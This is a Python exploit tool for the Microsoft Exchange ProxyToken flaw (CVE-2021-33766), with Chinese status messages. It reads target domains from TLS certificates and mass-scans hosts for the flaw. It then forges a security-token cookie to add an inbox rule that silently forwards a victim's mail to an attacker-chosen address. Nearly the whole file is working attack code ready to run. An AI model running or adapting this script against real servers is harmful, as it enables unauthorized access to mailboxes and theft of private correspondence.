import ssl
import OpenSSL
from cryptography import x509
import requests
from requests.models import Response
import urllib3
import sys
import time 
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_cert_from_endpoint(server, port=443):
    try:
        certificate: bytes  = ssl.get_server_certificate((server, port)).encode('utf-8')
        loaded_cert = x509.load_pem_x509_certificate(certificate)
        san = loaded_cert.extensions.get_extension_for_class(x509.SubjectAlternativeName)
        san_dns_names = san.value.get_values_for_type(x509.DNSName)
        # print("证书DNS名称：{}".format(san_dns_names))
        return san_dns_names
    except Exception:
        return None

def get_email_domain(url):
    # print(url)
    email_domain = []
    poc_url  = url.strip("\n").strip("https://").split(":")
    try:
        if len(poc_url) < 2:
            domain = get_cert_from_endpoint(poc_url[0],)
            ip, port =  poc_url[0], '443'
        else:
            domain = get_cert_from_endpoint(poc_url[0],poc_url[1])
            ip, port = poc_url[0], poc_url[1]
        for poc_domain in domain:
            if "." in poc_domain:
                poc1 = poc_domain.split(".")
                if len(poc1) == 2:
                    poc2 = ".".join(poc1)
                else:
                    poc3 = poc1[1:]
                    poc2 = ".".join(poc3)
                email_domain.append(poc2)
            else:
                pass
        # print(list(set(email_domain)))
        # print(poc_url)
        return list(set(email_domain)), ip, port
    except:
        rep = "[-] {} 获取SSL证书失败".format(url.strip("\n"))
        return rep

def proxytoken_check(ip,port,email_doamin):
    proxy={
        "http":"http://127.0.0.1:8080",
        "https":"https://127.0.0.1:8080"
    }
    poc_url = "https://{}:{}/ecp/Administrator@{}/PersonalSettings/HomePage.aspx?showhelp=false".format(ip,port,email_doamin)
    session = requests.Session()
    headers = {
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4371.0 Safari/537.36",
        "Connection":"close",
        "Accept-Language":"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding":"gzip, deflate",
        "Cookie":"SecurityToken=x",
        "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
    }
    try:
        response = session.get(url=poc_url, headers=headers, proxies=proxy, timeout=5,verify=False)
        if (response.status_code == 200 and "Outlook Web App" in response.text):
            res = "[+] {}:{} CVE-2021-33766 ProxyToken 漏洞存在！！！   域名 {}".format(ip,port,email_doamin)
            print(res)
            # print(response.status_code)
            # print(response.text)
            with open("./vul.txt","a+") as f:
                f.write(res + "\n")
            return True        
        elif response.status_code == 403:
            print("[-] {}:{} 状态码403，请求中的邮箱账户Administrator错误或不存在,请获取到正确的用户名后再次尝试.   域名 {}".format(ip,port,email_doamin))
            return True
        else:
            print("[-] {}:{} 漏洞不存在.    域名 {}".format(ip,port,email_doamin))
    except:
        print("[-] {}:{} 请求出错！！！".format(ip,port))
        sys.exit()

def Inbox_rule_added(ip,port,Victim_Email, Attack_Email):
    proxy={
        "http":"http://127.0.0.1:8080",
        "https":"https://127.0.0.1:8080"
    }
    poc_url = "https://{}:{}/ecp/{}/RulesEditor/InboxRules.svc/Newobject".format(ip,port,Victim_Email)
    session = requests.Session()
    headers = {
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4371.0 Safari/537.36",
        "Connection":"close",
        "Accept-Language":"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding":"gzip, deflate",
        "Cookie":"SecurityToken=x",
        "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Content-Type": "application/json; charset=utf-8"
    }
    response = session.post(url=poc_url, headers=headers, proxies=proxy, timeout=10,verify=False)
    if "msExchEcpCanary" in str(response.headers):
        msExchEcpCanary = dict(response.headers)["Set-Cookie"].split(",")[1].strip(" ").split(";")[0]
        print("[+] msExchEcpCanary获取成功: {}".format(msExchEcpCanary))
        rawBody = '{"properties":{"RedirectTo":[{"RawIdentity":"%s","DisplayName":"%s","Address":"%s","AddressOrigin":0,"galContactGuid":null,"RecipientFlag":0,"RoutingType":"SMTP","SMTPAddress":"%s"}],"Name":"Testrule","StopProcessingRules":true}}' % (Attack_Email,Attack_Email,Attack_Email,Attack_Email)
        # print(rawBody)
        exp_url = "https://{}:{}/ecp/{}/RulesEditor/InboxRules.svc/Newobject?{}".format(ip,port,Victim_Email,msExchEcpCanary)
        # print(exp_url)
        try:
            response = session.post(url=exp_url, headers=headers, data=rawBody,proxies=proxy, timeout=10,verify=False)
            if "New-InboxRule" in response.text:
                print("[+] {}:{} {} -> {} 邮件重定向规则添加成功".format(ip,port,Victim_Email,Attack_Email))
            else:
                print("[-] {}:{} {} -> {} 邮件重定向规则添加失败".format(ip,port,Victim_Email,Attack_Email))
        except:
            print("[-] {}:{} 请求出错！！！".format(ip,port))
            sys.exit()
    else:
        print("[-] msExchEcpCanary获取失败")

def main():
    parse = argparse.ArgumentParser(add_help=True,description='CVE-2021-33766 ProxyToken')
    parse.usage="""proxytoken.py [-h help] [-u Url] [-f File] [-c Check] [-v Victim_Email] [-a Attack_Email)]
    
example:
       Check_url:  python3 proxytoken.py -u http://192.168.1.1 -c
       Check_file: python3 proxytoken.py -f url.txt -c
       InboxRule_add: python3 proxytoken.py -u http://192.168.1.103 -v Victim@test.local -a Attack@test.local
    """
    parse.add_argument('-u',dest="url",help='Input Target_Url')
    parse.add_argument('-c',dest='check',action='store_true',help='Cheack Target')
    parse.add_argument('-f',dest='file',help='Input file')
    parse.add_argument('-v',dest='victim',help='Input Victim_Email')
    parse.add_argument('-a',dest='attack',help='Input Attack_Email')
    args = parse.parse_args()        
    if args.url and args.check:
        email_domain, ip, port = get_email_domain(args.url)
        for s_domain in email_domain:
            status = proxytoken_check(ip, port, s_domain)
            if status:
                break
            else:
                continue
    elif args.file and args.check:
        with ThreadPoolExecutor(max_workers=50) as t:
            obj_list = []
            check_list = []
            with open(args.file,"r") as f:
                urls = f.readlines()
            for url in urls:
                resq = t.submit(get_email_domain,url)
                obj_list.append(resq)
                # print(resq.result())
            for future in as_completed(obj_list):
                try:
                    data = future.result()
                    # print(data)
                    flag = 0
                    email_domain, ip, port = data
                    for s_domain in email_domain:
                        status = t.submit(proxytoken_check,ip, port, s_domain)
                        check_list.append(status)
                        for future in as_completed(check_list):
                            data1 = future.result()
                            if data1:
                                flag = 1
                            else:
                                flag = 0
                        if flag == 1:
                            break
                        else:
                            continue
                except:
                    pass
    elif args.url and args.victim and args.attack:
        email_domain, ip, port = get_email_domain(args.url)
        Inbox_rule_added(ip,port,args.victim,args.attack)
    else:
        parse.print_help()
if __name__ == "__main__":
    main()